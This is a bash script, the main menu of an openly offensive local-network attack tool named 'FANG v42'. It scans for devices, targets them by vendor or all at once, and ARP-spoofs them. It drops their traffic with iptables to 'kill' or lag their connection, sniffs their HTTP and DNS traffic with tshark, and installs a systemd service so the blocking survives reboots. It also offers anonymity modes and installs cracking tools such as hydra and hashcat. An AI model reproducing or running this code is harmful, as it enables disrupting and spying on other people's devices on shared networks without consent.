#!/bin/bash
# ============================================================
#  FANG v42 — Modular main (thin dispatcher)
# ============================================================

ROOT="$(cd "$(dirname "$0")" && pwd)"

# shellcheck source=/dev/null
source "$ROOT/lib/common.sh"
source "$ROOT/lib/targets.sh"
source "$ROOT/lib/ui.sh"
source "$ROOT/lib/scan.sh"
source "$ROOT/lib/attack.sh"
source "$ROOT/lib/anon.sh"

cleanup() {
    stop_session 2>/dev/null
    disable_killswitch 2>/dev/null
}
trap cleanup EXIT INT TERM

# ── Boot ───────────────────────────────────────────────────
require_root
init_dirs
load_targets
load_session 2>/dev/null

draw_banner

echo -e "  ${Y}Select interface${N}\n"
mapfile -t IFACES < <(ip -o link show | awk -F': ' '{print $2}' | grep -v lo)
for i in "${!IFACES[@]}"; do
    f=${IFACES[$i]}
    if [[ $f =~ ^wl || $f == *mon ]]; then
        echo -e "    $((i+1)))  ${G}$f${N}  ${Y}(wireless)${N}"
    else
        echo -e "    $((i+1)))  $f"
    fi
done
echo -e "    m)  Manual\n"
read -p "  Choice: " c

if [[ $c == m || $c == M ]]; then
    read -p "  Interface: " IFACE
elif [[ $c =~ ^[0-9]+$ ]] && ((c >= 1 && c <= ${#IFACES[@]})); then
    IFACE=${IFACES[$((c-1))]}
else
    IFACE=eth0
fi
[[ -z $IFACE ]] && exit 1

GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
MY_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
[[ -n $MY_IP ]] && ! is_protected "$MY_IP" && WHITELIST+=("$MY_IP")

log "Started on $IFACE"
health_check
echo ""
pause

# ── Main loop ─────────────────────────────────────────────
while true; do
    draw_banner
    draw_status
    draw_menu
    read -p "  Select: " choice

    case $choice in
        # Discovery
        1)
            echo -e "\n  1) Quick  2) Deep"
            read -p "  Mode [1]: " m; m=${m:-1}
            [[ $m == 2 ]] && do_scan deep || do_scan quick
            ;;
        2)
            echo -e "\n  ${Y}Devices${N}\n"
            ((${#SCANNED[@]} == 0)) && echo "    None yet"
            for ip in "${SCANNED[@]}"; do show_ip "$ip"; done
            pause
            ;;
        3)
            read -p "  IP: " ip
            if valid_ip "$ip"; then
                read -p "  Nickname: " name
                [[ -n $name ]] && NICKS[$ip]=$name && save_targets && ok "Saved"
            else
                err "Invalid IP"
            fi
            sleep 1
            ;;
        4)
            ((${#SCANNED[@]} == 0)) && { err "No devices"; sleep 1; continue; }
            i=1
            for ip in "${SCANNED[@]}"; do
                printf "  %2d) " $i; show_ip "$ip"; ((i++))
            done
            read -p "  #: " num
            if [[ $num =~ ^[0-9]+$ ]] && ((num >= 1 && num <= ${#SCANNED[@]})); then
                sel=${SCANNED[$((num-1))]}
                if is_protected "$sel"; then
                    err "Protected"
                else
                    TARGET=$sel
                    TARGETS=()
                    ok "Target → $TARGET"
                fi
            fi
            sleep 1.2
            ;;
        5)
            read -p "  IP: " ip
            if valid_ip "$ip" && ! is_protected "$ip"; then
                TARGET=$ip
                TARGETS=()
                ok "Target set"
            else
                err "Invalid or protected"
            fi
            sleep 1
            ;;
        6)
            echo -e "\n  1) Add  2) Remove"
            read -p "  #: " s
            if [[ $s == 1 ]]; then
                read -p "  IP: " ip
                if valid_ip "$ip" && ! is_protected "$ip"; then
                    TARGETS+=("$ip")
                    ok "Added"
                else
                    err "Invalid or protected"
                fi
            else
                ((${#TARGETS[@]} == 0)) && { err "Empty"; sleep 1; continue; }
                i=1
                for ip in "${TARGETS[@]}"; do echo "  $i) $ip"; ((i++)); done
                read -p "  Remove #: " n
                if [[ $n =~ ^[0-9]+$ ]] && ((n >= 1 && n <= ${#TARGETS[@]})); then
                    unset "TARGETS[$((n-1))]"
                    TARGETS=("${TARGETS[@]}")
                    ok "Removed"
                fi
            fi
            sleep 1
            ;;
        7)
            protect_self
            sleep 1.2
            ;;
        8)
            echo -e "\n  1) Apple  2) Samsung  3) Google  4) Xiaomi"
            echo "  5) Windows  6) Custom"
            read -p "  #: " d
            case $d in
                1) KEY="apple|iphone|ipad|mac";;
                2) KEY="samsung|galaxy";;
                3) KEY="google|pixel";;
                4) KEY="xiaomi|redmi|poco";;
                5) KEY="windows|desktop|pc|laptop";;
                6) read -p "  Keyword: " KEY;;
                *) continue;;
            esac
            do_scan quick
            MATCHED=()
            for ip in "${SCANNED[@]}"; do
                if echo "${HOSTNAMES[$ip]} $ip" | grep -Eiq "$KEY"; then
                    is_protected "$ip" || MATCHED+=("$ip")
                fi
            done
            if ((${#MATCHED[@]} == 0)); then
                err "No matches"
            else
                for ip in "${MATCHED[@]}"; do show_ip "$ip"; done
                ask "Target ${#MATCHED[@]} devices?" && {
                    TARGETS=("${MATCHED[@]}")
                    TARGET=""
                    ok "Targets set"
                }
            fi
            sleep 1.2
            ;;
        9)
            ask "Attack all non-protected?" || continue
            TARGETS=()
            for ip in "${SCANNED[@]}"; do
                is_protected "$ip" || TARGETS+=("$ip")
            done
            TARGET=""
            ok "${#TARGETS[@]} targets"
            sleep 1.3
            ;;

        # Attack (session-based)
        10) start_lag_session ;;
        11) start_kill_session ;;
        12)
            need_target || continue
            read -p "  Minutes: " M; M=${M:-5}
            T=$(get_targets)
            preflight "$T" || continue
            stop_session 2>/dev/null
            start_spoof "$T" || continue
            for ip in ${T//,/ }; do apply_drop "$ip"; done
            SESSION_ACTIVE=1
            ATTACK="Timed ${M}m"
            ATTACK_START=$(date +%s)
            save_session
            info "Killing for $M minutes..."
            sleep $((M * 60))
            stop_session
            pause
            ;;
        13) stop_session; sleep 1 ;;
        14) reapply_session ;;
        15)
            need_target || continue
            T=$(get_targets)
            for ip in ${T//,/ }; do
                echo -ne "  $ip → "
                ping -c 1 -W 1 "$ip" &>/dev/null && echo -e "${G}Online${N}" || echo -e "${R}Offline${N}"
            done
            pause
            ;;
        16) session_status ;;

        # Monitor
        17)
            need_target || continue
            T=$(get_targets)
            preflight "$T" || continue
            start_spoof "$T" || continue
            info "Live traffic (Ctrl+C to stop)"
            tshark -i "$IFACE" -f "host $T" -Y "http or dns" -T fields \
                -e frame.time_relative -e ip.src -e ip.dst -e http.host -e dns.qry.name 2>/dev/null
            ;;
        18)
            echo -e "\n  1) FANG rules  2) Latency"
            read -p "  #: " s
            if [[ $s == 1 ]]; then
                iptables -L FORWARD -n -v --line-numbers | grep -E "FANG|Chain|target" || iptables -L FORWARD -n -v --line-numbers
            else
                need_target || continue
                T=$(get_targets)
                for ip in ${T//,/ }; do
                    echo -ne "  $ip → "
                    ping -c 3 -W 1 "$ip" 2>/dev/null | tail -1 || echo "unreachable"
                done
            fi
            pause
            ;;

        # Anonymity
        19) ghost_mode ;;
        20) anon_menu ;;

        # System
        21)
            echo -e "\n  Custom: $CUSTOM_DIR"
            ls -la "$CUSTOM_DIR" 2>/dev/null || echo "  (empty)"
            pause
            ;;
        22)
            echo -e "\n  1) Enable persistence  2) Disable"
            read -p "  #: " s
            if [[ $s == 1 ]]; then
                need_target || continue
                T=$(get_targets)
                echo "IFACE=$IFACE" > "$PERSIST"
                echo "TARGETS=$T" >> "$PERSIST"
                cat > "$SERVICE" << EOF
[Unit]
Description=FANG Persistence
After=network-online.target
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'source $PERSIST; for ip in \$(echo \$TARGETS | tr "," " "); do iptables -I FORWARD -s \$ip -m comment --comment FANG -j DROP; iptables -I FORWARD -d \$ip -m comment --comment FANG -j DROP; done'
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target
EOF
                systemctl daemon-reload
                systemctl enable fang.service >/dev/null 2>&1
                ok "Persistence enabled"
            else
                systemctl disable fang.service >/dev/null 2>&1
                rm -f "$SERVICE" "$PERSIST"
                systemctl daemon-reload
                ok "Persistence disabled"
            fi
            sleep 1.3
            ;;
        23)
            echo -e "\n  1) Save  2) View log"
            read -p "  #: " s
            if [[ $s == 1 ]]; then
                save_targets
                save_session
                ok "Saved"
            else
                echo -e "\n  ${Y}Log${N}\n"
                tail -n 30 "$LOG_FILE" 2>/dev/null || echo "  Empty"
                pause
            fi
            ;;
        99)
            info "Installing dependencies..."
            apt update -y
            apt install -y bettercap iptables tshark nmap arp-scan macchanger \
                tor proxychains4 hashcat hydra ettercap-text-only 2>/dev/null
            ok "Done"
            health_check
            pause
            ;;
        0)
            save_targets
            save_session
            stop_session 2>/dev/null
            echo -e "\n  ${G}FANG out${N}\n"
            exit 0
            ;;
        *)
            err "Invalid option"
            sleep 1
            ;;
    esac
done
